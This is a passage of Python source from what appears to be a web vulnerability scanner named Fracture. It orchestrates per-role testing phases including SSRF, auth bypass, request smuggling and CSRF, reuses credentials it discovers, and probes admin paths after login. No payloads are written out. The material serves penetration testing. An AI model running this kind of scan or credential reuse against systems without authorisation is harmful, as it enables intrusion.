                pm.set_phase_status(f"traversal#{_ctx_label}", "running", "Path Traversal")
                try:
                    _phase_traversal(target, _ctx_cfg, pm, out, effective_auth, crawl_data)
                    pm.set_phase_status(f"traversal#{_ctx_label}", "complete", "Path Traversal")
                    _save_checkpoint()
                except Exception as e:
                    vc.error(f"Phase traversal [{_ctx_label}] error: {e}")
                    pm.set_phase_status(f"traversal#{_ctx_label}", "error", detail=str(e))

            # ── Phase 5b: business_logic ──
            if not _skip("business_logic"):
                pm.set_phase_status(f"business_logic#{_ctx_label}", "running", "Business Logic")
                try:
                    _phase_business_logic(target, _ctx_cfg, pm, out, effective_auth, crawl_data)
                    pm.set_phase_status(f"business_logic#{_ctx_label}", "complete",
                                        "Business Logic")
                    _save_checkpoint()
                except Exception as e:
                    vc.error(f"Phase business_logic [{_ctx_label}] error: {e}")
                    pm.set_phase_status(f"business_logic#{_ctx_label}", "error", detail=str(e))

            # ── Phase 6: ssrf ──
            if not _skip("ssrf"):
                pm.set_phase_status(f"ssrf#{_ctx_label}", "running", "SSRF Testing")
                try:
                    _phase_ssrf(target, _ctx_cfg, pm, out, effective_auth, crawl_data)
                    pm.set_phase_status(f"ssrf#{_ctx_label}", "complete", "SSRF Testing")
                    _save_checkpoint()
                except Exception as e:
                    vc.error(f"Phase ssrf [{_ctx_label}] error: {e}")
                    pm.set_phase_status(f"ssrf#{_ctx_label}", "error", detail=str(e))

            # ── Phase 7: auth_bypass ──
            if not _skip("auth_bypass"):
                pm.set_phase_status(f"auth_bypass#{_ctx_label}", "running", "Auth Bypass")
                try:
                    _bypass_found = _phase_auth_bypass(
                        target, _ctx_cfg, pm, out, effective_auth, crawl_data)
                    pm.set_phase_status(f"auth_bypass#{_ctx_label}", "complete", "Auth Bypass")
                    _save_checkpoint()
                    for _dc in (_bypass_found or []):
                        _dc_key = (_dc["username"], _dc["password"])
                        if _dc_key not in _discovered_creds_seen:
                            _discovered_creds_seen.add(_dc_key)
                            _dc_lbl = f"discovered_{_dc['username']}"
                            _dc_cfg = copy.deepcopy(cfg)
                            _dc_cfg["auth"]["enabled"]  = True
                            _dc_cfg["auth"]["username"] = _dc["username"]
                            _dc_cfg["auth"]["password"] = _dc["password"]
                            _dc_as  = _build_auth_session(_dc_cfg, "auth",
                                                             no_interactive=True)
                            _cred_contexts.append({"label": _dc_lbl, "cfg": _dc_cfg,
                                                   "auth_sess": _dc_as})
                            vc.log(
                                f"[auth_bypass] Queued re-scan with discovered "
                                f"credentials: {_dc['username']!r}", "INFO")
                except Exception as e:
                    vc.error(f"Phase auth_bypass [{_ctx_label}] error: {e}")
                    pm.set_phase_status(f"auth_bypass#{_ctx_label}", "error", detail=str(e))

            # ── Phase 7b: account_lockout ──
            if not _skip("account_lockout"):
                pm.set_phase_status(f"account_lockout#{_ctx_label}", "running", "Account Lockout")
                try:
                    _phase_account_lockout(target, _ctx_cfg, pm, out, effective_auth, crawl_data)
                    pm.set_phase_status(f"account_lockout#{_ctx_label}", "complete",
                                        "Account Lockout")
                    _save_checkpoint()
                except Exception as e:
                    vc.error(f"Phase account_lockout [{_ctx_label}] error: {e}")
                    pm.set_phase_status(f"account_lockout#{_ctx_label}", "error", detail=str(e))

            # ── Phase 8: files ──
            if not _skip("files"):
                pm.set_phase_status(f"files#{_ctx_label}", "running", "Sensitive Files")
                try:
                    _phase_files(target, _ctx_cfg, pm, out, effective_auth)
                    pm.set_phase_status(f"files#{_ctx_label}", "complete", "Sensitive Files")
                    _save_checkpoint()
                except Exception as e:
                    vc.error(f"Phase files [{_ctx_label}] error: {e}")
                    pm.set_phase_status(f"files#{_ctx_label}", "error", detail=str(e))

            # ── Phase 10: graphql ──
            if not _skip("graphql"):
                pm.set_phase_status(f"graphql#{_ctx_label}", "running", "GraphQL")
                try:
                    _phase_graphql(target, _ctx_cfg, pm, out, effective_auth)
                    pm.set_phase_status(f"graphql#{_ctx_label}", "complete", "GraphQL")
                    _save_checkpoint()
                except Exception as e:
                    vc.error(f"Phase graphql [{_ctx_label}] error: {e}")
                    pm.set_phase_status(f"graphql#{_ctx_label}", "error", detail=str(e))

            # ── Phase 10b: logging_monitoring ──
            if not _skip("logging_monitoring"):
                pm.set_phase_status(f"logging_monitoring#{_ctx_label}", "running",
                                    "Logging & Monitoring")
                try:
                    _phase_logging_monitoring(target, _ctx_cfg, pm, out, effective_auth, crawl_data)
                    pm.set_phase_status(f"logging_monitoring#{_ctx_label}", "complete",
                                        "Logging & Monitoring")
                    _save_checkpoint()
                except Exception as e:
                    vc.error(f"Phase logging_monitoring [{_ctx_label}] error: {e}")
                    pm.set_phase_status(f"logging_monitoring#{_ctx_label}", "error",
                                        detail=str(e))

            # ── Phase 11: auth_recon ──
            if not _skip("auth_recon"):
                if not _ctx_cfg["auth"].get("enabled"):
                    vc.log(f"[auth_recon] auth not enabled for [{_ctx_label}] — skipping",
                           "WARNING")
                    vc.status("auth_recon", "Auth Recon", "skipped")
                    pm.set_phase_status(f"auth_recon#{_ctx_label}", "skipped", "auth_recon")
                else:
                    pm.set_phase_status(f"auth_recon#{_ctx_label}", "running", "Auth Recon")
                    try:
                        auth_recon_data = _phase_auth_recon(
                            target, _ctx_cfg, pm, out, effective_auth, crawl_data)
                        pm.set_phase_status(f"auth_recon#{_ctx_label}", "complete", "Auth Recon")
                        _save_checkpoint()
                        for _k in ("forms", "links", "resource_ids"):
                            _combined_auth_recon[_k].extend(auth_recon_data.get(_k, []))
                    except Exception as e:
                        vc.error(f"Phase auth_recon [{_ctx_label}] error: {e}")
                        pm.set_phase_status(f"auth_recon#{_ctx_label}", "error", detail=str(e))

            # ── Phase 13: session ──
            if not _skip("session"):
                if not _ctx_cfg["auth"].get("enabled"):
                    vc.log(f"[session] auth not enabled for [{_ctx_label}] — skipping", "WARNING")
                    vc.status("session", "Session Analysis", "skipped")
                    pm.set_phase_status(f"session#{_ctx_label}", "skipped", "session")
                else:
                    pm.set_phase_status(f"session#{_ctx_label}", "running", "Session Analysis")
                    try:
                        _phase_session(target, _ctx_cfg, pm, out, effective_auth)
                        pm.set_phase_status(f"session#{_ctx_label}", "complete",
                                            "Session Analysis")
                        _save_checkpoint()
                    except Exception as e:
                        vc.error(f"Phase session [{_ctx_label}] error: {e}")
                        pm.set_phase_status(f"session#{_ctx_label}", "error", detail=str(e))

            # ── Phase 14: csrf ──
            if not _skip("csrf"):
                if not _ctx_cfg["auth"].get("enabled"):
                    vc.log(f"[csrf] auth not enabled for [{_ctx_label}] — skipping", "WARNING")
                    vc.status("csrf", "CSRF Testing", "skipped")
                    pm.set_phase_status(f"csrf#{_ctx_label}", "skipped", "csrf")
                else:
                    pm.set_phase_status(f"csrf#{_ctx_label}", "running", "CSRF Testing")
                    try:
                        _phase_csrf(target, _ctx_cfg, pm, out, effective_auth, auth_recon_data)
                        pm.set_phase_status(f"csrf#{_ctx_label}", "complete", "CSRF Testing")
                        _save_checkpoint()
                    except Exception as e:
                        vc.error(f"Phase csrf [{_ctx_label}] error: {e}")
                        pm.set_phase_status(f"csrf#{_ctx_label}", "error", detail=str(e))

            # ── Phase 16: open_redirect ──
            if not _skip("open_redirect"):
                pm.set_phase_status(f"open_redirect#{_ctx_label}", "running", "Open Redirect")
                try:
                    _phase_open_redirect(target, _ctx_cfg, pm, out, effective_auth, crawl_data)
                    pm.set_phase_status(f"open_redirect#{_ctx_label}", "complete", "Open Redirect")
                    _save_checkpoint()
                except Exception as e:
                    vc.error(f"Phase open_redirect [{_ctx_label}] error: {e}")
                    pm.set_phase_status(f"open_redirect#{_ctx_label}", "error", detail=str(e))

            # ── Phase 17: deserialization ──
            if not _skip("deserialization"):
                pm.set_phase_status(f"deserialization#{_ctx_label}", "running", "Deserialization")
                try:
                    _phase_deserialization(target, _ctx_cfg, pm, out, effective_auth, crawl_data)
                    pm.set_phase_status(f"deserialization#{_ctx_label}", "complete",
                                        "Deserialization")
                    _save_checkpoint()
                except Exception as e:
                    vc.error(f"Phase deserialization [{_ctx_label}] error: {e}")
                    pm.set_phase_status(f"deserialization#{_ctx_label}", "error", detail=str(e))

            # ── Phase 17b: request_smuggling ──
            # Transport-layer test — only meaningful on the first (non-reduced)
            # context since the vulnerability is independent of the auth role.
            if not _skip("request_smuggling") and not _is_reduced_ctx:
                pm.set_phase_status(f"request_smuggling#{_ctx_label}", "running",
                                    "Request Smuggling")
                try:
                    _phase_request_smuggling(target, _ctx_cfg, pm, out,
                                             effective_auth, crawl_data)
                    pm.set_phase_status(f"request_smuggling#{_ctx_label}", "complete",
                                        "Request Smuggling")
                    _save_checkpoint()
                except Exception as e:
                    vc.error(f"Phase request_smuggling [{_ctx_label}] error: {e}")
                    pm.set_phase_status(f"request_smuggling#{_ctx_label}", "error",
                                        detail=str(e))

            # ── Phase 18: file_upload_info ──
            if not _skip("file_upload_info"):
                pm.set_phase_status(f"file_upload_info#{_ctx_label}", "running", "File Upload Info")
                try:
                    _phase_file_upload_info(target, _ctx_cfg, pm, out, effective_auth, crawl_data)
                    pm.set_phase_status(f"file_upload_info#{_ctx_label}", "complete",
                                        "File Upload Info")
                    _save_checkpoint()
                except Exception as e:
                    vc.error(f"Phase file_upload_info [{_ctx_label}] error: {e}")
                    pm.set_phase_status(f"file_upload_info#{_ctx_label}", "error", detail=str(e))

            # ── Phase 19: mass_assignment ──
            if not _skip("mass_assignment"):
                pm.set_phase_status(f"mass_assignment#{_ctx_label}", "running", "Mass Assignment")
                try:
                    _phase_mass_assignment(target, _ctx_cfg, pm, out, effective_auth, crawl_data)
                    pm.set_phase_status(f"mass_assignment#{_ctx_label}", "complete",
                                        "Mass Assignment")
                    _save_checkpoint()
                except Exception as e:
                    vc.error(f"Phase mass_assignment [{_ctx_label}] error: {e}")
                    pm.set_phase_status(f"mass_assignment#{_ctx_label}", "error", detail=str(e))

            # ── Gap Coverage Tests (v2.42.0) ─────────────────────────────
            # These run once on the primary context (not reduced) unless the
            # test is specifically relevant to per-role comparison.

            # ── Header extensions (cookie prefixes, HSTS preload, COOP/COEP/CORP) ──
            if not _skip("headers") and not _is_reduced_ctx:
                try:
                    _test_cookie_prefixes(target, _ctx_cfg, out, effective_auth)
                except Exception as _e:
                    vc.error(f"[cookie_prefixes] {_e}")
                try:
                    _test_hsts_preload(target, _ctx_cfg, out, effective_auth)
                except Exception as _e:
                    vc.error(f"[hsts_preload] {_e}")
                try:
                    _test_coop_coep_corp(target, _ctx_cfg, out, effective_auth)
                except Exception as _e:
                    vc.error(f"[coop_coep_corp] {_e}")
                try:
                    _test_content_type_confusion(target, _ctx_cfg, out, effective_auth)
                except Exception as _e:
                    vc.error(f"[content_type_confusion] {_e}")
                try:
                    _test_trace_xst(target, _ctx_cfg, out, effective_auth)
                except Exception as _e:
                    vc.error(f"[trace_xst] {_e}")

            # ── Source map disclosure ──
            if not _skip("recon") and not _is_reduced_ctx:
                try:
                    _test_source_maps(target, _ctx_cfg, out, effective_auth, crawl_data)
                except Exception as _e:
                    vc.error(f"[source_maps] {_e}")

            # ── Injection extensions ──
            if not _skip("injection") and not _is_reduced_ctx:
                try:
                    _test_prototype_pollution_server(target, _ctx_cfg, out, effective_auth, crawl_data)
                except Exception as _e:
                    vc.error(f"[prototype_pollution_server] {_e}")
                try:
                    _test_prototype_pollution_client(target, _ctx_cfg, out, effective_auth, crawl_data)
                except Exception as _e:
                    vc.error(f"[prototype_pollution_client] {_e}")
                try:
                    _test_ssi_injection(target, _ctx_cfg, out, effective_auth, crawl_data)
                except Exception as _e:
                    vc.error(f"[ssi_injection] {_e}")
                try:
                    _test_esi_injection(target, _ctx_cfg, out, effective_auth, crawl_data)
                except Exception as _e:
                    vc.error(f"[esi_injection] {_e}")
                try:
                    _test_email_header_injection(target, _ctx_cfg, out, effective_auth, crawl_data)
                except Exception as _e:
                    vc.error(f"[email_header_injection] {_e}")

            # ── Auth extensions ──
            if not _skip("auth_bypass") and not _is_reduced_ctx:
                try:
                    _test_unicode_normalization(target, _ctx_cfg, out, effective_auth, crawl_data)
                except Exception as _e:
                    vc.error(f"[unicode_normalization] {_e}")
                try:
                    _test_mfa_bypass(target, _ctx_cfg, out, effective_auth, crawl_data)
                except Exception as _e:
                    vc.error(f"[mfa_bypass] {_e}")
                try:
                    _test_password_policy(target, _ctx_cfg, out, effective_auth, crawl_data)
                except Exception as _e:
                    vc.error(f"[password_policy] {_e}")
                try:
                    _test_verb_tunneling(target, _ctx_cfg, out, effective_auth, crawl_data)
                except Exception as _e:
                    vc.error(f"[verb_tunneling] {_e}")

            # ── CSRF advanced ──
            if not _skip("csrf") and not _is_reduced_ctx:
                try:
                    _test_csrf_advanced(target, _ctx_cfg, out, effective_auth, crawl_data)
                except Exception as _e:
                    vc.error(f"[csrf_advanced] {_e}")

            # ── GraphQL advanced ──
            if not _skip("graphql") and not _is_reduced_ctx:
                try:
                    _test_graphql_advanced(target, _ctx_cfg, out, effective_auth, crawl_data)
                except Exception as _e:
                    vc.error(f"[graphql_advanced] {_e}")

            # ── API rate limiting ──
            if not _skip("account_lockout") and not _is_reduced_ctx:
                try:
                    _test_api_rate_limiting(target, _ctx_cfg, out, effective_auth, crawl_data)
                except Exception as _e:
                    vc.error(f"[api_rate_limiting] {_e}")

            # ── Request smuggling extensions (h2c) ──
            if not _skip("request_smuggling") and not _is_reduced_ctx:
                try:
                    _test_h2c_smuggling(target, _ctx_cfg, out, effective_auth)
                except Exception as _e:
                    vc.error(f"[h2c_smuggling] {_e}")

            # ── WebSocket testing (new phase) ──
            if not _skip("websocket") and not _is_reduced_ctx:
                pm.set_phase_status(f"websocket#{_ctx_label}", "running", "WebSocket Testing")
                try:
                    _phase_websocket(target, _ctx_cfg, pm, out, effective_auth, crawl_data)
                    pm.set_phase_status(f"websocket#{_ctx_label}", "complete", "WebSocket Testing")
                    _save_checkpoint()
                except Exception as e:
                    vc.error(f"Phase websocket [{_ctx_label}] error: {e}")
                    pm.set_phase_status(f"websocket#{_ctx_label}", "error", detail=str(e))

            # ── Web cache deception ──
            if not _skip("recon") and not _is_reduced_ctx:
                try:
                    _test_web_cache_deception(target, _ctx_cfg, out, effective_auth)
                except Exception as _e:
                    vc.error(f"[web_cache_deception] {_e}")

            # ── OAuth/OIDC flow testing ──
            if not _skip("auth_bypass") and not _is_reduced_ctx:
                try:
                    _test_oauth_flows(target, _ctx_cfg, out, effective_auth, crawl_data)
                except Exception as _e:
                    vc.error(f"[oauth_flows] {_e}")

            # ── End gap coverage tests ───────────────────────────────────

            # ── Phase 21: bfla ──
            if not _skip("bfla"):
                if not _role1_accessible_endpoints:
                    vc.log(f"[bfla] No Role 1 endpoints fingerprinted — skipping [{_ctx_label}]",
                           "INFO")
                    vc.status("bfla", "BFLA Testing", "skipped")
                    pm.set_phase_status(f"bfla#{_ctx_label}", "skipped", "bfla")
                elif not _is_reduced_ctx:
                    # Role 1 itself — nothing to compare against yet; skip silently.
                    vc.status("bfla", "BFLA Testing", "skipped")
                    pm.set_phase_status(f"bfla#{_ctx_label}", "skipped", "bfla")
                elif _ctx_auth is None and _ctx_label != "unauthenticated":
                    # Auth failed for this role — BFLA results would be
                    # misleading (session is effectively unauthenticated).
                    vc.log(f"[bfla] Skipping BFLA for role '{_ctx_label}' — "
                           f"auth failed, results would reflect unauth access", "WARNING")
                    pm.set_phase_status(f"bfla#{_ctx_label}", "skipped", "bfla")
                else:
                    pm.set_phase_status(f"bfla#{_ctx_label}", "running", "BFLA Testing")
                    try:
                        _phase_bfla(target, _ctx_cfg, pm, out,
                                    _role1_accessible_endpoints, _ctx_auth, _ctx_label)
                        pm.set_phase_status(f"bfla#{_ctx_label}", "complete", "BFLA Testing")
                        _save_checkpoint()
                    except Exception as e:
                        vc.error(f"Phase bfla [{_ctx_label}] error: {e}")
                        pm.set_phase_status(f"bfla#{_ctx_label}", "error", detail=str(e))

            # ── Stop keepalive ────────────────────────────────────────────
            # All testing phases are done.  Stop the heartbeat before the
            # access matrix sync / probe phase so it doesn't interfere with
            # session expiry detection logic in _probe_role_paths.
            if _keepalive is not None:
                try:
                    _keepalive.stop()
                except Exception:
                    pass

            # Consolidate all finding URLs into structure_map before access matrix sync.
            # Findings from every phase (headers, shcheck, files, etc.) may reference
            # paths that were never written to structure_map incrementally.  Scanning
            # findings_json here ensures every discovered path is tracked.
            try:
                _findings_urls: list = []
                _fj = out.findings_json
                if _fj.exists():
                    for _fentry in json.loads(_fj.read_text()):
                        for _fkey in ("url", "affected"):
                            _fval = _fentry.get(_fkey, "")
                            if _fval and isinstance(_fval, str):
                                _findings_urls.append(_fval)
                if _findings_urls:
                    _write_structure_map(out, target, extra_urls=_findings_urls)
            except Exception:
                pass

            # Sync access_matrix.json with the full structure_map path list before
            # probing so that _probe_role_paths finds an entry for every path
            # (including paths added late in this context after the last incremental
            # write).  _probe_role_paths skips paths with no access matrix entry, so
            # this write must come first.
            try:
                _write_preliminary_access_matrix(out, target, [_ctx_label])
            except Exception:
                pass

            # ── Seed discovery leader from structure_map ─────────────────
            # For the non-reduced (discovery leader) context, the structure_map
            # already holds valid HTTP status codes recorded during this role's
            # own crawl/recon phases.  Seed those into the access matrix so
            # _probe_role_paths only probes paths that genuinely have no
            # confirmed status for this role.  This eliminates hundreds of
            # redundant probes and prevents session-expiry from corrupting
            # already-confirmed data.
            #
            # NOT done for reduced (non-leader) contexts because the
            # structure_map codes are from Role 1's session, not theirs.
            if not _is_reduced_ctx:
                try:
                    _seed_sm = out.root / "structure_map.json"
                    _seed_am = out.root / "access_matrix.json"
                    if _seed_sm.exists() and _seed_am.exists():
                        _seed_sm_data = json.loads(_seed_sm.read_text())
                        _seed_am_data = json.loads(_seed_am.read_text())
                        _seed_sm_paths = _seed_sm_data.get("paths", {})
                        _seed_changed = False
                        for _seed_entry in _seed_am_data.get("paths", []):
                            _sp = _seed_entry.get("path", "")
                            _sa = _seed_entry.get("access", {})
                            if _sa.get(_ctx_label) is not None:
                                continue  # already has a real code
                            _sm_info = _seed_sm_paths.get(_sp)
                            if isinstance(_sm_info, dict):
                                _sm_status = _sm_info.get("status")
                                # Only seed stable status codes — 200, 3xx,
                                # 401, 403, 404.  Never seed 500/502/503:
                                # discovery tools (gobuster) don't send the
                                # same headers as _probe_role_paths (e.g. no
                                # Accept: application/json), so API endpoints
                                # may return 500 due to content-negotiation
                                # failure rather than real access denial.
                                # Letting _probe_role_paths re-verify with
                                # proper headers produces the correct code.
                                if (isinstance(_sm_status, int) and _sm_status > 0
                                        and _sm_status < 500):
                                    _sa[_ctx_label] = _sm_status
                                    _seed_changed = True
                        if _seed_changed:
                            _seed_am.write_text(json.dumps(_seed_am_data, indent=2))
                            _seeded_count = sum(
                                1 for _se in _seed_am_data.get("paths", [])
                                if _se.get("access", {}).get(_ctx_label) is not None
                            )
                            _total_count = len(_seed_am_data.get("paths", []))
                            vc.log(
                                f"[access-matrix] Seeded {_seeded_count}/{_total_count} "
                                f"paths for {_ctx_label} from structure_map — "
                                f"_probe_role_paths will only fill the remaining "
                                f"{_total_count - _seeded_count} gaps",
                                "INFO")
                except Exception:
                    pass

            # Probe structure_map paths with this role's session.
            # _write_preliminary_access_matrix above guarantees all paths have an
            # entry; the structure_map seeding above (for the discovery leader)
            # pre-fills confirmed codes.  _probe_role_paths fills only the
            # remaining None slots for this role.
            try:
                _probe_role_paths(out, target, _ctx_cfg, _ctx_label, _ctx_auth,
                                  landing_url=_as_canary_url or _as_landing_url or "")
            except Exception:
                pass

            # Store this role's session and landing URL for retroactive probing
            # by later re-discovery runs and for Phase 20 canary cross-checks.
            # Use the requests-viable canary URL (pre-SPA resolution) — on SPA
            # targets the Chrome-resolved URL may not work with requests sessions
            # (browser-only: requests gets 302 to login).
            if _ctx_label != "unauthenticated":
                _completed_role_sessions[_ctx_label] = _ctx_auth
                if _as_canary_url and _as_canary_code == 200:
                    _role_landing_urls[_ctx_label] = _as_canary_url
                elif _as_landing_url and _as_landing_code == 200:
                    _role_landing_urls[_ctx_label] = _as_landing_url

            # ── Post-auth landing-page discovery probe ────────────────────────
            # The landing page (e.g. /OMT/Client/Dashboard) marks the start of
            # the authenticated web application.  Probe admin panel and common
            # paths under the landing URL and its parents so structure_map
            # captures authenticated-area paths that recon (pre-auth) cannot see.
            _post_auth_landing = _role_landing_urls.get(_ctx_label, "")
            if _post_auth_landing and _ctx_label != "unauthenticated":
                _pa_parsed = urllib.parse.urlparse(_post_auth_landing)
                _pa_origin = f"{_pa_parsed.scheme}://{_pa_parsed.netloc}"
                _pa_bases = []
                _pa_path = _pa_parsed.path.rstrip("/")
                if _pa_path:
                    _pa_parts = _pa_path.split("/")
                    for _pi in range(2, len(_pa_parts) + 1):
                        _pa_b = _pa_origin + "/".join(_pa_parts[:_pi])
                        _pa_bases.append(_pa_b)
                if _pa_bases:
                    vc.log(
                        f"[recon-postauth] Probing admin/common paths under "
                        f"landing page for {_ctx_label}: {_pa_parsed.path}",
                        "INFO",
                    )
                    _pa_sm_updates = {}
                    for _pa_base in _pa_bases:
                        _pa_bp = urllib.parse.urlparse(_pa_base).path.rstrip("/")
                        for _pa_ap in _ADMIN_PATHS + _COMMON_PATHS:
                            _pa_fp = (_pa_bp + _pa_ap) if _pa_bp else _pa_ap
                            try:
                                _pa_r = _ctx_auth.get(
                                    _pa_base.rstrip("/") + _pa_ap,
                                    timeout=cfg.get("timeout", 10),
                                    allow_redirects=False,
                                )
                                _pa_sm_updates[_pa_fp] = _pa_r.status_code
                                if _pa_r.status_code == 200:
                                    vc.log(
                                        f"[recon-postauth] {_pa_fp} → {_pa_r.status_code}",
                                        "SUCCESS",
                                    )
                            except Exception:
                                pass
                    if _pa_sm_updates:
                        try:
                            _write_structure_map(
                                out, target,
                                path_statuses=_pa_sm_updates,
                                source="recon-postauth",
                            )
                        except Exception:
                            pass

            # ── Discovery-leader check ────────────────────────────────────────
            # After each authenticated non-reduced context, compare this role's
            # access score against the current discovery leader. If the new role
            # beats the leader by _DISCOVERY_RESCORE_THRESHOLD or has more
            # privileged-path 200s, it becomes the new discovery leader and
            # gobuster/feroxbuster re-run for it. All prior roles are then probed
            # against any newly discovered endpoints.
            # Excluded: unauthenticated, reduced contexts, and the current leader
            # itself (a role cannot outscore itself — the stored leader score is a
            # snapshot from when the role was first elected; later phases inflate
            # the live score, causing a spurious self-outscore comparison).
            if (
                _ctx_label != "unauthenticated"
                and not _is_reduced_ctx
                and _ctx_label != _discovery_leader
                and _n_roles >= 1
            ):
                try:
                    _new_score = _score_role_access(out, target, _ctx_label)
                    _is_first_leader = not _discovery_leader
                    _beats_leader = (
                        _discovery_leader_score["score"] > 0
                        and _new_score["score"] > _discovery_leader_score["score"] * _DISCOVERY_RESCORE_THRESHOLD
                    ) or (
                        _new_score["n200_priv"] > _discovery_leader_score["n200_priv"]
                        and _new_score["n200_priv"] > 0
                    )

                    if _is_first_leader:
                        # First authenticated role always becomes the leader; busting
                        # already ran during its full recon, no re-run needed.
                        _discovery_leader = _ctx_label
                        _discovery_leader_score = _new_score
                        vc.log(
                            f"[discovery-leader] '{_ctx_label}' is initial discovery leader "
                            f"(score={_new_score['score']}, n200={_new_score['n200']}, "
                            f"n200_priv={_new_score['n200_priv']})",
                            "INFO",
                        )
                    elif _beats_leader:
                        vc.log(
                            f"[discovery-leader] '{_ctx_label}' outscores '{_discovery_leader}' "
                            f"(new score={_new_score['score']} vs leader={_discovery_leader_score['score']}, "
                            f"n200_priv {_new_score['n200_priv']} vs {_discovery_leader_score['n200_priv']}). "
                            "Re-running gobuster/feroxbuster for new leader.",
                            "INFO",
                        )
                        # Re-run busting as the new leader's session
                        _prev_ep_base = set(_ep_base)
                        try:
                            _new_buster_urls = _run_buster_only(
                                target, _ctx_cfg, out, effective_auth,
                                wc_baseline=wc_baseline,
                                role_label=_ctx_label,
                            )
                        except Exception as _be:
                            vc.error(f"[discovery-leader] _run_buster_only error: {_be}")
                            out.log_error("feroxbuster", "discovery-leader buster", str(_be))
                            _new_buster_urls = []

                        # Identify newly discovered URLs not seen by prior busting
                        _newly_found = [
                            u for u in _new_buster_urls
                            if u.rstrip("/") not in _prev_ep_base
                            and u.rstrip("/") != target["url"].rstrip("/")
                        ]
                        if _newly_found:
                            vc.log(
                                f"[discovery-leader] {len(_newly_found)} new URL(s) found by "
                                f"'{_ctx_label}' busting — retroactively probing all prior roles.",
                                "INFO",
                            )
                            # Merge new URLs into _ep_base for subsequent phases
                            for _nu in _newly_found:
                                _nup = _nu.rstrip("/")
                                if _nup not in _prev_ep_base:
                                    _ep_base.append(_nup)
                            # Retroactively probe all completed prior roles
                            try:
                                _retroactive_probe(
                                    out, target, _ctx_cfg,
                                    _newly_found,
                                    _completed_role_sessions,
                                )
                            except Exception as _rpe:
                                vc.error(f"[discovery-leader] _retroactive_probe error: {_rpe}")
                            # Probe the new leader itself for the new URLs
                            try:
                                _probe_role_paths(out, target, _ctx_cfg, _ctx_label, _ctx_auth,
                                                  landing_url=_as_landing_url or "")
                            except Exception:
                                pass
                        else:
                            vc.log(
                                f"[discovery-leader] No new URLs found by '{_ctx_label}' "
                                "busting beyond prior discovery.",
                                "INFO",
                            )

                        _discovery_leader = _ctx_label
                        _discovery_leader_score = _new_score
                except Exception as _dse:
                    vc.error(f"[discovery-leader] Scoring error: {_dse}")

            # ── Multi-role: prompt for the next role's credentials ───────────
            # Only triggered after a multi_role authenticated context whose
            # successor has not yet been collected (first target only; subsequent
            # targets reuse _collected_roles populated here).
            if (
                _ctx.get("multi_role")
                and _ctx_label != "unauthenticated"
            ):
                _next_idx = _ctx.get("role_idx", 0) + 1
                if _next_idx < _n_roles and _next_idx >= len(_collected_roles):
                    # Collect credentials for the next role now
                    _nr_creds = _prompt_next_role_creds(_next_idx + 1, _n_roles)
                    _collected_roles.append(_nr_creds)
                    if _nr_creds["role"] not in _all_roles_ctx:
                        _all_roles_ctx.insert(-1, _nr_creds["role"])  # before "unauthenticated"
                    _nr_cfg = copy.deepcopy(cfg)
                    _nr_cfg["auth"]["enabled"]  = True
                    _nr_cfg["auth"]["username"] = _nr_creds["username"]
                    _nr_cfg["auth"]["password"] = _nr_creds["password"]
                    _nr_as = _build_auth_session(_nr_cfg, "auth", _scope_hostnames)
                    if _nr_as:
                        _attach_redirect_hook(_nr_as, _scope_hostnames, target,
                                              out, _in_scope_new)
                    # Insert before the unauthenticated context (always last)
                    _cred_contexts.insert(-1, {
                        "label":      _nr_creds["role"],
                        "cfg":        _nr_cfg,
                        "auth_sess":  _nr_as,
                        "reduced":    True,
                        "multi_role": True,
                        "role_idx":   _next_idx,
                    })

            # Save checkpoint at end of every credential context
            _save_checkpoint()

        # ── Post-context: "No Web Structure" check ──────────────────────────
        # Emit an INFO finding if no meaningful paths were discovered during
        # the scan (only the root "/" in structure_map, or map absent entirely).
        try:
            _sm_path_final = out.root / "structure_map.json"
            _sm_paths_found: list = []
            if _sm_path_final.exists():
                _sm_data = json.loads(_sm_path_final.read_text(encoding="utf-8"))
                _sm_paths_found = [
                    p for p in _sm_data.get("paths", {}).keys()
                    if p not in ("/", "")
                ]
            if not _sm_paths_found:
                _ns_ev = str(_sm_path_final) if _sm_path_final.exists() else None
                out.add_finding(
                    title="Discovery: No Web Structure Identified",
                    url=target["url"],
                    port=target["port"],
                    risk="INFO",
                    description=(
                        "No directories or files were discovered during testing beyond "
                        "the application root. This may indicate the wordlists did not "
                        "match the application structure, all paths require authentication, "
                        "or the application relies entirely on front-end routing (SPA)."
                    ),
                    output="No paths discovered beyond /",
                    output_file=_ns_ev,
                    affected="/",
                    sources="fracture-structure",
                    service=target["scheme"],
                    owasp="",
                    nist="",
                )
        except Exception:
            pass

        # ── Post-context: end-of-scan auth verification review ───────────────
        # Read authentication_status.json, compare each authenticated role's
        # landing URL and cookies against the unauthenticated baseline to
        # identify possible authentication failures that were not caught during
        # the live scan.  Prompt the user to re-test any suspicious roles.
        try:
            _auth_status_path = out.root / "authentication_status.json"
            if _auth_status_path.exists():
                _auth_entries: list = json.loads(_auth_status_path.read_text(encoding="utf-8"))
                _unauth_entry = next(
                    (e for e in _auth_entries if e.get("role") == "unauthenticated"),
                    None
                )
                _unauth_url     = (_unauth_entry or {}).get("landing_url", "")
                _unauth_cookies = {c["name"] for c in (_unauth_entry or {}).get("cookies", [])}

                for _ae in _auth_entries:
                    if _ae.get("role") in ("unauthenticated", ""):
                        continue
                    if _ae.get("status") == "failed":
                        # Already marked failed — flag but don't re-evaluate
                        vc.log(
                            f"[auth-verify] Role '{_ae['role']}' status=failed "
                            f"(user: {_ae.get('username','?')})",
                            "WARNING",
                        )
                        _should_prompt_retest = True
                    else:
                        # Heuristic cross-check against unauthenticated baseline
                        _ae_url     = _ae.get("landing_url", "")
                        _ae_cookies = {c["name"] for c in _ae.get("cookies", [])}
                        _ae_signals: list = []

                        # Same landing URL as unauthenticated = auth likely failed
                        if _ae_url and _unauth_url and _ae_url == _unauth_url:
                            _ae_signals.append("landing URL same as unauthenticated")

                        # No cookies beyond what unauthenticated has
                        _ae_extra = _ae_cookies - _unauth_cookies
                        if not _ae_extra and not _ae.get("auth_headers"):
                            _ae_signals.append("no new cookies or auth headers beyond unauthenticated state")

                        _should_prompt_retest = bool(_ae_signals)
                        if _ae_signals:
                            vc.log(
                                f"[auth-verify] Role '{_ae['role']}' may have failed: "
                                f"{'; '.join(_ae_signals)}",
                                "WARNING",
                            )

                    if _should_prompt_retest and not no_interactive:
                        try:
                            _retest_role  = _ae["role"]
                            _retest_user  = _ae.get("username", "")
                            _retest_label = f"'{_retest_role}'" + (f" ({_retest_user})" if _retest_user else "")
                            _retest_ans = vc.prompt(
                                f"Authentication for role {_retest_label} appears to have failed. "
                                f"Re-test this role? (If Yes, re-run Fracture with valid credentials "
                                f"for this role.)",
